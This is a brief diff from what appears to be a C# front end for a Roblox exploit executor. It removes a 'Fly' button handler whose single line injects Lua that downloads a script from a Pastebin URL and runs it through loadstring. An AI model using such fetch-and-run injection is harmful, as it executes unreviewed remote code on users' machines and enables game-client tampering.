@@ -564,16 +564,6 @@
         }
 
         /// <summary>
-        /// The onButtonFly_Click.
-        /// </summary>
-        /// <param name="sender">The sender<see cref="object"/>.</param>
-        /// <param name="e">The e<see cref="EventArgs"/>.</param>
-        private void onButtonFly_Click(object sender, EventArgs e)
-        {
-            wrdExploitAPI.SendLuaScript("loadstring(game:HttpGet('https://pastebin.com/raw/ETeUDwvV', true))()");
-        }
-
-        /// <summary>
         /// The killRblx_Click.
         /// </summary>
         /// <param name="sender">The sender<see cref="object"/>.</param>
